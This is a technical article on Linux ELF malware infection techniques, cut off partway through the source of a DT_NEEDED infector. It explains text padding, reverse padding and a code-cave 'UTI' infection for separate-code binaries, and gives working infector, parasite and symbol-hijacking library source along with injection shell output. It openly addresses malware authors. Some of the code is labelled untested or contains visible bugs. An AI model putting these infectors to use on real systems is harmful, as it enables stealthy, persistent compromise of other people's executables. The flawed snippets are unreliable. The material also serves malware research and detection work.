Modern day Linux malware infection techniques with ELF
Author: ElfMaster - ryan@bitlackeys.org

- Introduction
- SCOP Primer
- Code injection techniques
- Traditional text segment padding infection
- Text segment padding infection in SCOP binaries
- Psuedo-Code of SCOP Text segment padding infection
- Traditional reverse text padding infections
- Layout of SCOP program segments
- Qualities of a reverse text padding infection
- SCOP Reverse text infections
- UTI (Ultimate text infection) for SCOP binaries only
- SCOP UTI (Ultimate text infection) algorithm
- Note on resolving the address of Elf_hdr->e_entry in PIE executable's
- Resurrecting the past with DT_NEEDED .so injection techniques
- Example of using dt_infect for shared library injection
- DT_NEEDED infection algorithm for symbol hijacking

-= 1.0 Introduction

With the recent introduction of SCOP (Secure code partitioning) security
mitigation, or otherwise known as the 'ld -separate-code' feature there are
naturally going to be some changes in the way ELF segments are parsed, and even
more thought provoking is how malware authors will infect them. In addition to
SCOP infections we will be exploring philosophies around traditional infection
techniques and even discuss a lost technique for shared library injection via
DT_NEEDED. All of the code in this paper uses libelfmaster [9] for portable
design, convenience and portability. Lets explore a quick primer to SCOP
executables before jumping right into the Malware techniques.

-= 1.1 SCOP Primer

A SCOP binary, termed "SCOP" from the publication [1] is an ELF executable that
has been linked with the ld(1) separate-code option in more recent versions of
ld(1). SCOP binaries are becoming the norm on modern Linux OS's, and already
the standard in several distributions such as lubuntu 18. The general idea is
that the text (code) segment is typically only a single segment described by a
single PT_LOAD segment that is typically marked with R+X permissions. There are
many areas within an executable that must be read-only, such as the .rodata
section, but do not require execution. On average there are about 18 sections
within the text segment and only 4 of which require execution. Therefore the
remaining 14 sections are executable in memory, though they only require read
access.  An astute security researcher would recognize that this exposes a
larger attack surface for ROP gadgets. A quick scan with ROP gadget scanning
tools such as [10] will show you that there are useable gadgets that exist
within sections holding relocation, symbol, note, version, and string data. The
software devs who work on ld(1) realized that it made alot of sense to add a
feature to the linker that assigns read-only sections into read-only PT_LOAD
segments, and read+execute sections into a single read+execute PT_LOAD segment.
Only 4 sections (on average) require execution: .init, .plt, .text, .fini.
This results in an executable with a text segment that is broken up into 3
segments, and reduces the ROP gadget attack surface. SCOP binaries are
dissected in the suggested pre-requisite reading [1]. We also explore SCOP
throughout this paper which highlights some nuances that are not covered in [1]
but are relevant when infecting SCOP executables.

-= 1.2 A quick primer on the text segment layout

In traditional executables the loadable segments tradtionally look
like the ascii illustration 1.0 below.

-Illustration 1.0
	      PT_LOAD 0		PT_LOAD 1
[text_segment(R+X)][data_segment(R+W)]

The readonly data which doesn't require execution, again, are stored in the
read-only part of the executable known as the text segment.
If one gives a close observation it becomes quickly apparent that there are
only four or five sections in the text segment that actually require execution,
and the linker marks them respectively with the sh_flags value being set to
SHF_ALLOC|SHF_EXECINSTR, whereas the sections that are read-only are marked as
SHF_ALLOC, meaning they are allocated into memory, and that's it.

Here is the output of 'readelf -S' on a traditional 32bit executable, we
examine only the sections that are in the text segment, I have truncated the
rest of the output.

  [ 0]			 NULL		 00000000 000000 000000 00	0   0  0
  [ 1] .interp		 PROGBITS	 08048154 000154 000013 00   A	0   0  1
  [ 2] .note.ABI-tag	 NOTE		 08048168 000168 000020 00   A	0   0  4
  [ 3] .note.gnu.build-i NOTE		 08048188 000188 000024 00   A	0   0  4
  [ 4] .gnu.hash	 GNU_HASH	 080481ac 0001ac 000020 04   A	5   0  4
  [ 5] .dynsym		 DYNSYM		 080481cc 0001cc 000060 10   A	6   1  4
  [ 6] .dynstr		 STRTAB		 0804822c 00022c 000050 00   A	0   0  1
  [ 7] .gnu.version	 VERSYM		 0804827c 00027c 00000c 02   A	5   0  2
  [ 8] .gnu.version_r	 VERNEED	 08048288 000288 000020 00   A	6   1  4
  [ 9] .rel.dyn		 REL		 080482a8 0002a8 000008 08   A	5   0  4
  [10] .rel.plt		 REL		 080482b0 0002b0 000018 08  AI	5  23  4
  [11] .init		 PROGBITS	 080482c8 0002c8 000023 00  AX	0   0  4
  [12] .plt		 PROGBITS	 080482f0 0002f0 000040 04  AX	0   0 16
  [13] .plt.got		 PROGBITS	 08048330 000330 000008 08  AX	0   0  8
  [14] .text		 PROGBITS	 08048340 000340 0001c2 00  AX	0   0 16
  [15] .fini		 PROGBITS	 08048504 000504 000014 00  AX	0   0  4
  [16] .rodata		 PROGBITS	 08048518 000518 00000f 00   A	0   0  4
  [17] .eh_frame_hdr	 PROGBITS	 08048528 000528 00003c 00   A	0   0  4
  [18] .eh_frame	 PROGBITS	 08048564 000564 0000fc 00   A	0   0  4


Notice that only five sections are requiring execution, the rest are set to
SHF_ALLOC ('A') or in the case of '.rel.plt.' SHF_ALLOC|SHF_INFO_LINK ('AI')
which indicates that the sh_info member links to another section. Now for those
who don't have a full grasp of the ELF format, remember that these section
permissions are only useful for linking and debugging code at best; however as
demonstrated in the parsing support for SCOP binaries that we recently merged
into libelfmaster [9] we observed that the section headers are very useful when
heuristically analyzing SCOP binaries with LOAD segments that have had their
p_flags (Memory permissions) modified such as with various infection methods.
While parsing hostile or tampered SCOP binaries we can compare the sh_flags of
allocated sections with the p_flags of the corresponding PT_LOAD segments.  If
the permissions are consistent accross both sh_flags and p_flags then the SCOP
binary is very likely untampered. The important thing to note here is that the
section header sh_flags directly correlate to how the executable is divided
into corresponding segments with equivalent p_flags.

NOTE: The astute reader may realize that its possible for an attacker to modify
the section header sh_flags to reflect the program header p_flags.

With SCOP binaries which are illustrated in [1] we no longer have the convention
of a single LOAD segment for the text image. Afterall, why store read-only code
in an executable region when it may contain ROP gadgets? This was a smart move
by the GNU ld(1) developers. ELF illustration 1.1 shows what a SCOP
binary looks like from the perspective of the program headers.

-Illustration 1.1 

   PT_LOAD 0	    PT_LOAD 1		PT_LOAD 2	  PT_LOAD 3
[text_segment(R)][text_segment(R+X)][text_segment(R)][data segment(R+W)]

-= 1.3 Code injection techniques

I see several ways to instrument the binary with a chunk of additional
executable code, while still keeping the ELF headers in-tact. First though
let us discuss very briefly some of the existing infection techniques that
we used, and are discussed in great depth in [2] and [3]

-= 2.0 Traditional Text segment padding infection

This infection relies on the fact that the text and data segment are flush
against eachother on disk, but since the p_vaddr must be congruent with the
p_offset modulo PAGE_SIZE, we must first extend the p_filesz/p_memsz of the
text segment, and then adjust the p_offset's of the subsequent segments by
shifting forward a PAGE_SIZE, i.e. p_offset += 4096. Please note that this does
not mean that there will be 4096 bytes of useable space for the parasite code,
it means that there will be (data[PT_LOAD].p_vaddr & ~4095) - (text[PT_LOAD].p_vaddr +
text[PT_LOAD].p_memsz); However this limitation is more relevant on 32bit
systems. On x86_64 we can shift the p_offset's that follow the text segment
forward by (parasite_size + 4095 & ~4095) bytes, extending further due to the
fact that x86_64 architecture uses HUGE_PAGES for the elfclass64 binaries
which are 0x200000 bytes in size.

This technique was first conceived (Or atleast published) by Silvio Cesare and
it was brilliant research that impacted me greatly, inspiring my passion as I
delved into the esoteric world of binary formats, and how to meticulously
modify their structure without breaking the format specification that the
kernel requires to be in-tact.

The following illustration shows a traditional text segment padding infection
on disk.

-Illustration 2.0

[ehdr][phdr][text:parasite_size_extension(R+X)][data(R+W)]

-= 2.1 Layout of SCOP program segments

This hardly poses a challenge to the adept binary hacker. After a brief glance
at the program header table on a SCOP binary we see that the same specification
rules exist, and that there is HUGE_PAGE's being used allowing for much larger
infection sizes on 64bit.

  LOAD		 0x0000000000000000 0x0000000000400000 0x0000000000400000
		 0x00000000000004d0 0x00000000000004d0	R      0x200000
  LOAD		 0x0000000000200000 0x0000000000600000 0x0000000000600000
		 0x000000000000021d 0x000000000000021d	R E    0x200000
  LOAD		 0x0000000000400000 0x0000000000800000 0x0000000000800000
		 0x0000000000000148 0x0000000000000148	R      0x200000

-= 2.1.2 SCOP Program segments as displayed in /proc/<pid>/maps

00400000-00401000 r--p 00000000 fd:01 3540930	test_scop_binary
00600000-00601000 r-xp 00200000 fd:01 3540930	test_scop_binary
00800000-00801000 r--p 00400000 fd:01 3540930	test_scop_binary

The text segment is broken up into 3 diferent memory mappings. The end of the
executable mapping (Which is PT_LOAD[1]) is at 0x601000. This virtual address
that begins the 3rd text segment (PT_LOAD[2]) is at 0x8000000, which leaves
quite a bit of space for infection in general. For injections that require
arbitrary length infections there are alternative solutions; see [4] and [5]
which use PT_NOTE to PT_LOAD conversions.

-= 2.2 Text segment padding infection in SCOP binaries

The algorithm used for the existing technique is similar to the original
text segment padding infection except that all phdr->p_offset's after the
first executable LOAD segment: PT_LOAD[1] are adjusted instead of all
phdr->p_offset's after PT_LOAD[0].

Using an example with libelfmaster we will demonstrate the algorithm for
infecting both types of binaries; those which are linked with SCOP and those
that are more traditional.  This should detail the algorithm enough so that
malware authors, virus enthusiasts, and reverse engineers from all walks can
begin infecting SCOP binaries with the historical and brilliant text segment
padding infection conceived by Silvio [3].

NOTE: libelfmaster has some API functions specifically for handling the text segment
in SCOP binaries: elf_scop_text_filesz, elf_executable_text_base,
elf_executable_text_offset. These are different than the traditional API
functions we also have available: elf_text_filesz, elf_text_base,
elf_text_offset.

Since this type of infection is well explored and the difference in approach
is so subtle, I have given an example of some un-tested code shown below that
demonstrates how a text segment padding infection [3] would look. Do not fret
though, in section 3.4 we give the source code for a totally new type of
ELF infection that is specific to SCOP binaries.

-= 2.3 Psuedo Example of SCOP Text segment pdading infection

... main function, etc. ...

struct elf_segment segment;
elf_segment_iterator_t p_iter;
elfobj_t obj;
bool res, found_text = false;
uint64_t text_vaddr, parasite_vaddr;
size_t parasite_size = SOME_VALUE;

res = elf_open_object(argv[1], &obj,
    ELF_LOAD_F_STRICT|ELF_LOAD_F_MODIFY, &error);
if (res == false) {
	printf("failed: %s\n", elf_error_msg(&error));
	exit(EXIT_FAILURE);
}
elf_segment_iterator_init(&obj, &p_iter);
while (elf_segment_iterator_next(&p_iter, &segment) != NULL) {
	if (elf_flags(&obj, ELF_SCOP_F) == true) {
		/*
		 * elf_executable_text_base() will return the value
		 * of PT_LOAD[1] since it is the part of the text
		 * segments that have executable permissions.
		 */
		if (segment.vaddr == (text_vaddr = elf_executable_text_base(&obj))) {
			struct elf_segment new_text;
			uint64_t parasite_vaddr, old_e_entry, end_of_text;

			parasite_vaddr = segment.vaddr + segment.filesz;
			old_e_entry = elf_entry_point(&obj);
			end_of_text = segment.offset + segment.filesz;
			memcpy(&new_text, &segment, sizeof(segment));
			new_text.filesz += parasite_size;
			new_text.memsz += parasite_size;
			elf_segment_modify(&obj, p_iter.index - 1, &new_text,
			    &error);
			found_text = true;
	} else { /* If this is not a SCOP binary then we just look for the
		  * text segment by finding the first PT_LOAD at a minimum
		  */
		if (segment.offset == 0 && segment.type == PT_LOAD) {
			struct elf_segment new_text;				 
			uint64_t parasite_vaddr, old_e_entry, end_of_text;	 

			text_vaddr = segment.vaddr;
			parasite_vaddr = segment.vaddr + segment.filesz;	 
			old_e_entry = elf_entry_point(&obj);			 
			end_of_text = segment.offset + segment.filesz;		 
			memcpy(&new_text, &segment, sizeof(segment));		 
			new_text.filesz += parasite_size;			 
			new_text.memsz += parasite_size;			 
			elf_segment_modify(&obj, p_iter.index - 1, &new_text,	 
			    &error);						 
			found_text = true;
		}
	}
	if (found_text == true && segment.vaddr > text_vaddr) {
		/*
		 * If we have found the text segment, then we must adjust
		 * the subsequent segment's p_offset's.
		 */
		struct elf_segment new_segment;
		memcpy(&new_segment, &segment, sizeof(segment));
		new_segment.offset += (parasite_size + ((PAGE_SIZE - 1) & ~(PAGE_SIZE - 1));
		elf_segment_modify(&obj, p_iter.index - 1, &new_segment,
		    &error);
	}
	ehdr->e_entry = parasite_vaddr;
	/*
	 * Then of course you must adjust ehdr->e_shoff accordingly
	 * and ehdr->e_entry can point to your parasite code.
	 */
}
... 

-= 3.0 Traditional reverse text padding infections

A reverse text padding infection of which a good example can be demonstrated in
the Skeksi Virus [6], is the concept of:

1. subtracting the text segment's p_vaddr by PAGE_ALIGN(parasite_len) 

2. extending the size of the text segment by adjusting p_filesz, and p_memsz by
PAGE_ALIGN(parasite_len) bytes

3. shifting the program header table and interp segment forward
PAGE_ALIGN(parasite_len) bytes by adjusting p_offset's accordingly

4. Update elf_hdr->e_shoff, i.e. elf_hdr->e_shoff += PAGE_ALIGN(parasite_len)

5. Update the .text section's offset and address to match where the parasite
begins, i.e. shdr->sh_offset = old_text_base + sizeof(ElfN_Ehdr) 

-= 3.1 Qualities of a reverse text padding infection

The primary benefits of this infection are that it allows a significantly large
amount of space to inject code in ET_EXEC files. On a 64bit Linux system with
the standard linker script used, an executable has a text base address of
0x400000, thus the maximum parasite length would be 0x400000 -
PAGE_ALIGN_UP(sizeof(ElfN_Ehdr)) = 4.1MB of space. It is also a favorable infection
because it allows the modification of e_entry (Entry point) to point in
the .text section which could potentially circumvent weak Virus heuristics.

The primary disadvantage of this technique is that it will not work with PIE
executables. In theory it could work with SCOP binaries [1] by extending the
2nd PT_LOAD segment in reverse, but as we will see shortly there is a much
better infection technique for regular and PIE executables when SCOP [1] is
being used.

Illustration 1.1

Before infection:

0x400000				    0x600e10
[elf_hdr][phdrs][interp][text_segment(R+X)][data_segment(R+W)]

Illustration 1.2

After infection:

0x3ff000					      0x600e10
[elf_hdr][parasite][phdrs][interp][text_segment(R+X)][data_segment(R+W)]

It could also be visualized in a different way since the text segment
technically begins at the beginning of the file at the 0th offset where elf_hdr
is depicted.

Illustration 1.3

0x3ff000					0x600e10
[reverse text extension <-> original text(R+X)][data segment(R+W)]

-= 3.2 SCOP Reverse text infections

With SCOP linked binaries we have a theoretical approach. SCOP binaries are by
convention compiled and linked as PIE executable's which pretty much exclude
them from this infection type. There is one theoretical idea if which applied you
should be able to perform the algorithm as it is already laid out, but instead
of reversing PT_LOAD[0] which hase a base address of 0x0, you can reverse the
PT_LOAD[1] segment which is the text segment's R+X code separated segment in
SCOP binaries. With that said, there is a much better infection method for SCOP
binaries that lends itself very nicely to those who want to easily insert large
amounts of code into the target binary without having to make any adjustments
to the ELF file headers.

-= 3.3 UTI (Ultimate text infection) for SCOP ELF binaries

This is where we get into some more fresh material...

$ gcc -fPIC -pie test.c -o test
$ gcc -fPIC -pie -Wl,-z,separate-code test.c -o test_scop

$ ls -lh test
-rwxrwxr-x 1 elfmaster elfmaster 8.1K Mar 28 13:44 test
$ ls -lh test_scop
-rwxrwxr-x 1 elfmaster elfmaster 4.1M Mar 28 13:44 test_scop
$

Notice that there is an enormous difference in file size for these two
executables 'test' and 'test_scop' which contain approximately the same amount
of code and data. In the original writeup for SCOP [1] we hadn't yet paid note
to this, but it is an important detail that conveniently lends itself to Virus
authors and other binary hackers who want to instrument or modify a binary in
some arbitrary way. Whether or not this was an oversight by the ld(1)
developers I am not entirely sure, but I haven't yet found a reason to justify
this caveat.

The exact details on why the test_scop is so much larger than test is because
SCOP binaries have p_offset's that are identical to their p_vaddr's for the
first 3 load segments. This is not necessary, because the only requirement for
an executable segment to load is that its p_vaddr and p_offset must be
congruent modulo a PAGE_SIZE. Looking at the first 3 PT_LOAD segments we can
see that there is a vast amount of space on-disk in between the 1st and 2nd
segment, and in between the 2nd and 3rd segment. The 2nd segment is R+X so this
is ideally the one we want to use. In the test_scop binary the 2nd PT_LOAD
segment has a p_filesz of 0x24d (589 decimal) bytes. The offset of the 3rd
segment is at 0x400000. This means that we have an injection space available to
us that can be calculated by PT_LOAD[2].p_offset - PT_LOAD[1].p_offset +
PT_LOAD[1].p_filesz.  For the test_scop binary this results in 2096563 bytes of
padding length. This is an unusually large code cave for ELF binary types.

As it turns out the SCOP [1] binary mitigation not only helps tighten down the ROP
gadget regions, but it eases the process of inserting code into the executable.

Illustration 1.4
		PT_LOAD[0]   PT_LOAD[1]			 PT_LOAD[2]    PT_LOAD[3]
[elf_hdr][phdrs][text rdonly][text rd+exec][text-parasite][text rdonly][data]

-= 3.4 SCOP UTI Algorithm

1. Insert code into file at PT_LOAD[1].p_offset + PT_LOAD[1].p_filesz
2. Backup original PT_LOAD[1].p_filesz: size_t o_filesz = PT_LOAD[1].p_filesz;
2. Adjust PT_LOAD[1].p_filesz += code_length
3. Adjust PT_LOAD[1].p_memsz += code_length
4. Modify ehdr->e_entry to point at PT_LOAD[1].p_vaddr + o_filesz
5. In our case egg.c contains PIC code for jumping back to the original
entry point which changes at runtime due to ASLR.

-= 3.5 Note on resolving Elf_Hdr->e_entry in PIE executable's

If the target executable is PIE, then the parasite must be able to calculate
the original entry point address in certain circumstances; primarily when the
branch instruction used requires an absolute address. The Elf_hdr->e_entry will
change at runtime once the kernel has randomly relocated the executable to an
arbitrary address space. Our parasite code egg.c has a text and data segment
merged into one PT_LOAD segment, this allows for easy access to the data
segment with position independent code. The egg has two variables that are
initialized and therefore stored in the .data section (And explicitly not the
.bss). We have the following two unsigned global integers:

static unsigned long o_entry __attribute__((section(".data"))) = {0x00}; static
unsigned long vaddr_of_get_rip __attribute__((section(".data"))) = {0x00};

During the injection of egg into the target binary we load o_entry with the
value of Elf_hdr->e_entry which is an address into the PIE executable and will
be changed at runtime. We load vaddr_of_get_rip with the address of where we
injected the get_rip() function from ./egg into target. Even though the
addresses of get_rip() and Elf_hdr->e_entry are going to change at runtime,
they are still at a fixed distance from eachother, so we can use the delta
between them and subtract it from the return value of the get_rip() function
which returns the address of the current instruction pointer. We are therefore
using IP relative addressing tricks that are not at all new to virus writers to
jump back to the original entry point. Using IP relative addressing tricks to
calculate the new e_entry address is only necessary when using branch
instructions that require an absolute address such as indirect jmp, call,
or push/ret combo. Otherwise you can simply use an immediate jmp or
call on the original e_entry value.

The get_rip() technique is old-school and primarily useful for finding the
address of objects within its own body of code (The parasite).


-- egg.c (The parasite) --

/*
 * scop_infect.c will patch these initialized .data
 * section variables. We initialize them so that
 * they do not get stored into the .bss which is
 * non-existent on disk. We patch the variables with
 * with the value of e_entry, and the address of where
 * the get_rip() function gets injected into the target
 * binary. These are then subtracted from eachother and
 * from the instruction pointer to get the correct
 * address to jump to.
 */
static unsigned long o_entry __attribute__((section(".data"))) = {0x00};
static unsigned long vaddr_of_get_rip __attribute__((section(".data"))) = {0x00};

unsigned long get_rip(void);

extern long get_rip_label;
extern long real_start;

/*
 * Code to jump back to entry point
 */
int volatile _start() {
	/*
	 * What we are doing essentially:
	 * size_t delta = &get_rip_injected_code - original_entry_point;
	 * relocated_entry_point = %rip - delta;
	 */
	unsigned long n_entry = get_rip() - (vaddr_of_get_rip - o_entry);

	__asm__ volatile (
		"movq %0, %%rbx\n"
		"jmpq *%0" :: "g"(n_entry)
		);
}

unsigned long get_rip(void)
{
	long ret;
	__asm__ __volatile__
	(
	"call get_rip_label	\n"
	".globl get_rip_label	\n"
	"get_rip_label:		\n"
	"pop %%rax		\n"
	"mov %%rax, %0" : "=r"(ret)
	);

}


-- infector (scop_infector.c) --

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <elf.h>
#include <link.h>
#include <stdbool.h>
#include <unistd.h>

#include "/opt/elfmaster/include/libelfmaster.h"

#define PAGE_ALIGN_UP(x) ((x + 4095) & ~4095)
#define PAGE_ALIGN(x) (x & ~4095)

#define TMP ".xyz.bitch"

size_t code_len = 0;
static uint8_t *code = NULL;

bool
patch_payload(const char *path, elfobj_t *target, elfobj_t *egg,
    uint64_t injection_vaddr)
{
	elf_error_t error;
	struct elf_symbol get_rip_symbol, symbol, real_start_symbol;
	struct elf_section section;
	uint8_t *ptr;
	size_t delta;

	if (elf_open_object(path, egg,
	    ELF_LOAD_F_STRICT|ELF_LOAD_F_MODIFY, &error) == false) {
		fprintf(stderr, "elf_open_object(): %s\n", elf_error_msg(&error));
		return false;
	}

	if (elf_symbol_by_name(egg, "get_rip", &get_rip_symbol) == false) {
		fprintf(stderr, "elf_symbol_by_name(\"get_rip\", ...)\n");
		return false;
	}
	if (elf_symbol_by_name(egg, "_start", &real_start_symbol) == false) {
		fprintf(stderr, "elf_symbol_by_name(\"real_start\", ...)\n");
		return false;
	}

	delta = get_rip_symbol.value - real_start_symbol.value;
	injection_vaddr += delta;

	elf_symbol_by_name(egg, "vaddr_of_get_rip", &symbol);
	ptr = elf_address_pointer(egg, symbol.value);
	*(uint64_t *)&ptr[0] = injection_vaddr;
	elf_symbol_by_name(egg, "o_entry", &symbol);
	ptr = elf_address_pointer(egg, symbol.value);
	*(uint64_t *)&ptr[0] = elf_entry_point(target);

	return true;
}

int main(int argc, char **argv)
{
	int fd;
	elfobj_t elfobj;
	elf_error_t error;
	struct elf_segment segment;
	elf_segment_iterator_t p_iter;
	size_t o_filesz;
	size_t code_len;
	uint64_t text_offset, text_vaddr;
	ssize_t ret;
	elf_section_iterator_t s_iter;
	struct elf_section s_entry;
	struct elf_symbol symbol;
	uint64_t egg_start_offset;
	elfobj_t eggobj;
	uint8_t *eggptr;
	size_t eggsiz;

	if (argc < 2) {
		printf("Usage: %s <SCOP_ELF_BINARY>\n", argv[0]);
		exit(EXIT_SUCCESS);
	}
	if (elf_open_object(argv[1], &elfobj,
	    ELF_LOAD_F_STRICT|ELF_LOAD_F_MODIFY, &error) == false) {
		fprintf(stderr, "elf_open_object(): %s\n", elf_error_msg(&error));
		exit(EXIT_FAILURE);
	}
	if (elf_flags(&elfobj, ELF_SCOP_F) == false) {
		fprintf(stderr, "%s is not a SCOP binary\n", elf_pathname(&elfobj));
		exit(EXIT_SUCCESS);
	}
	elf_segment_iterator_init(&elfobj, &p_iter);
	while (elf_segment_iterator_next(&p_iter, &segment) == ELF_ITER_OK) {
		if (segment.type == PT_LOAD && segment.flags == (PF_R|PF_X)) {
			struct elf_segment s;

			text_offset = segment.offset;
			o_filesz = segment.filesz;
			memcpy(&s, &segment, sizeof(s));
			s.filesz += sizeof(code);
			s.memsz += sizeof(code);
			text_vaddr = segment.vaddr;
			if (elf_segment_modify(&elfobj, p_iter.index - 1, &s, &error) == false) {
				fprintf("stderr, segment_segment_modify(): %s\n",
				    elf_error_msg(&error));
				exit(EXIT_FAILURE);
			}
			break;
		}
	}
	/*
	 * Patch ./egg so that its two global variables 'uint64_t o_entry'
	 * and 'uint64_t vaddr_of_get_rip' are set to the original entry
	 * point of the target executable, and the address of where within
	 * that executable the get_rip() function will be injected.
	 */
	if (patch_payload("./egg", &elfobj, &eggobj,
	    text_offset + o_filesz) == false) {
		fprintf(stderr, "Failed to patch payload \"./egg\"\n");
		goto done;
	}

	/*
	 * NOTE We must use PAGE_ALIGN on elf_text_base() because it's PT_LOAD
	 * is a merged text and data segment, which results in having a p_offset
	 * larger than 0, even though the initial ELF file header actually starts
	 * at offset 0. Check out 'gcc -N -nostdlib -static code.c -o code' and
	 * examine phdr's etc. to understand what I mean.
	 */
	elf_symbol_by_name(&eggobj, "_start", &symbol);
	egg_start_offset = symbol.value - PAGE_ALIGN(elf_text_base(&eggobj));
	eggptr = elf_offset_pointer(&eggobj, egg_start_offset);
	eggsiz = elf_size(&eggobj) - egg_start_offset;

	switch(elf_class(&elfobj)) {
	case elfclass32:
		elfobj.ehdr32->e_entry = text_vaddr + o_filesz;
		break;
	case elfclass64:
		elfobj.ehdr64->e_entry = text_vaddr + o_filesz;
		break;
	}
	/*
	 * Extend the size of the section that the parasite code
	 * ends up in
	 */
	elf_section_iterator_init(&elfobj, &s_iter);
	while (elf_section_iterator_next(&s_iter, &s_entry)
	    == ELF_ITER_OK) {
		if (s_entry.size + s_entry.address == text_vaddr + o_filesz) {
			s_entry.size += eggsiz;
			elf_section_modify(&elfobj, s_iter.index - 1,
			    &s_entry, &error);
		}
	}
	elf_section_commit(&elfobj);

	fd = open(TMP, O_RDWR|O_CREAT|O_TRUNC, 0777);
	ret = write(fd, elfobj.mem, text_offset + o_filesz);
	ret = write(fd, eggptr, eggsiz);
	ret = write(fd, &elfobj.mem[text_offset + o_filesz + eggsiz],
	    elf_size(&elfobj) - text_offset + o_filesz + eggsiz);
	if (ret < 0) {
		perror("write");
		goto done;
	}
done:
	close(fd);
	rename(TMP, elf_pathname(&elfobj));
	elf_close_object(&elfobj);
}

-= 4.0 Resurrecting the past with DT_NEEDED .so injection techniques

Recently I have been building ELF malware detection technology and am not always
able to find the samples I need for certain infection types. I needed a
DT_NEEDED infector, and one that was capable of overriding existing symbols
through shared library resolution precedence-- this results in a sort of
permanent LD_PRELOAD effect.  Traditionally hackers have overwritten the
DT_DEBUG dynamic tag and changed it to a DT_NEEDED, which is quite easy to
detect. dt_infect v1.0 https://github.com/elfmaster/dt_infect [8] is able to
infect using both methods. Originally I thought that Mayhem, the innovative
force (and brilliant hacker all around) behind ERESI [7] had only written about
DT_DEBUG overwrites, but I took a skim over a rather old phrack publication
[6] and discovered that he had already covered both DT_NEEDED infection
techniques; including precedence overriding for symbol hijacking. Props
to Mayhem for paving the way for many others.

I'm not entirely sure of the algorithm that ERESI [7] uses for DT_NEEDED
infection, but I imagine it is very similar to how dt_infect [8] works.

-= 4.1 Example of using dt_infect for shared library injection

The goal of this infection is to add a shared library dependency to a binary
so that the library is loaded before any others. This is similar to using
LD_PRELOAD. Create a shared library with a function from libc.so that you
want to hijack, and modify its behavior before calling the original function
using dlsym(). This is essentially shared library injection into an executable
and can be used for all sorts of creative reasons: keyloggers, virus infection,
security instrumentation, etc. In the following example we hijack the function
called 'void puts(const char *)' from libc. The libevil.c code is the shared
library we are going to inject that has a modified version of puts().

$ ./test
I am a host executable for testing purposes
$ readelf -d test | grep NEEDED
0x0000000000000001 (NEEDED)		Shared library: [libc.so.6]
$ ./inject test
Creating reverse text padding infection to store new .dynstr section
Updating .dynstr section
Modified d_entry.value of DT_STRTAB to: 3ff040 (index: 9)
Successfully injected 'libevil.so' into target: 'test'.
Make sure to move 'libevil.so' into one of the shared object search paths, i.e. /lib/x86_64-gnu-linux/

$ sudo cp libevil.so /lib/x86_64-linux-gnu/
$ sudo ldconfig
$ ./test
$ readelf -d test | grep NEEDED
 0x0000000000000001 (NEEDED)		 Shared library: [libevil.so]
 0x0000000000000001 (NEEDED)		 Shared library: [libc.so.6]
$ ./test
1 4m 4 h057 3x3cu74bl3 f0r 73571ng purp0535
$ 


-= 4.2 DT_NEEDED infection algorithm for symbol hijacking

NOTE: I naively used a reverse-text-padding infection to make room
for the new .dynstr section. This however does not work with PIE
binaries due to the constraints on that infection method. This is
of course trivial to fix by simply changing the injection method
to something that works with PIE (i.e. text padding infection,
or PT_NOTE to PT_LOAD infection, UTI infection etc.).

1. Reverse text infection to make space for a new .dynstr section
2. memcpy old .dynstr into the code cave created by step 1
3. Append a terminated string with the evil shared library basename to
the new .dynstr
4. Confirm there is enough space after the dynamic segment to shift all
ElfN_Dyn entries forward by sizeof(Elf_Dyn) entry bytes.
5. Re-create the dynamic segment in the following way:
	- Insert a new DT_NEEDED entry before any other dynamic tags
	  and its d_un.d_val should point to dynstr_vaddr + old_dynstr_len
	- Modify DT_STRTAB tag so that d_un.d_val = dynstr_vaddr
	- The new dynamic segment should look something like this:
	  [DT_NEEDED: "evil_lib.so"]
	  [DT_NEEDED: "libc.so"]
	  [.. several more tags ...]
	  [DT_STRTAB: 0x3ff000] (Address of new .dynstr location)


The code in libevil.c will demonstrate how we modify the behavior of the 'void
puts(const char *)' function from libc.so. The dt_infect code below that will
demonstrate the algorithm for injecting the libevil.so dependency into a target
executable. This will only work with executables that are ET_EXEC's due to the
reverse text padding injection for the .dynstr table. Notice that dt_infect has
a -f option to overwrite the DT_DEBUG tag instead of overriding other
dependencies with your own shared object; this will however require manual
modification of the .got.plt table to call your functions.

-= 4.3 The code for DT_NEEDED infection with symbol hijacking.

---- libevil.c ----

/*
 * l33t sp34k version of puts() for DT_NEEDED .so injection
 * elfmaster 2/15/2019
 */
#define _GNU_SOURCE
#include <dlfcn.h>

/*
 * This code is a l33t sp34k version of puts
 */

long _write(long, char *, unsigned long);

char _toupper(char c)
{
	if( c >='a' && c <= 'z')
		return (c = c +'A' - 'a');
	return c;
}

void ___memset(void *mem, unsigned char byte, unsigned int len)
{
	unsigned char *p = (unsigned char *)mem;
	int i = len;
	while (i--) {
		*p = byte;
		p++;
	}
}

int puts(const char *string)
{
	char *s = (char *)string;
	char new[1024];
	int index = 0;

	int (*o_puts)(const char *);

	o_puts = (int (*)(const char *))dlsym(RTLD_NEXT, "puts");

	___memset(new, 0, 1024);
	while (*s != '\0' && index < 1024) {
		switch(_toupper(*s)) {
			case 'I':
				new[index++] = '1';
				break;
			case 'E':
				new[index++] = '3';
				break;
			case 'S':
				new[index++] = '5';
				break;
			case 'T':
				new[index++] = '7';
				break;
			case 'O':
				new[index++] = '0';
				break;	
			case 'A':
				new[index++] = '4';
				break;
			default:
				new[index++] = *s;
				break;
		}
		s++;
	}

	return o_puts((char *)new);
}

More interestingly is the code that injects this shared object dependency into
the target executable.

---- dt_infect.c ----


#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <elf.h>
#include <link.h>
#include <stdbool.h>
#include <unistd.h>

#include "/opt/elfmaster/include/libelfmaster.h"

#define PAGE_ALIGN_UP(x) ((x + 4095) & ~4095)

#define PT_PHDR_INDEX 0
#define PT_INTERP_INDEX 1

#define TMP "xyz.tmp"

bool dt_debug_method = false;
bool calculate_new_dynentry_count(elfobj_t *, uint64_t *, uint64_t *);

/*
 * arg1: target elf object
 * arg2: string name, i.e. "evil.so"
 * arg3: address of .dynstr (Which is now in a different location)
 * arg4: offset of "evil.so" within .dynstr
 */
bool
modify_dynamic_segment(elfobj_t *target, uint64_t dynstr_vaddr,
    uint64_t evil_offset)
{
	bool use_debug_entry = false;
	bool res;
	uint64_t dcount, dpadsz, index;
	uint64_t o_dcount = 0, d_index = 0, dt_debug_index = 0;
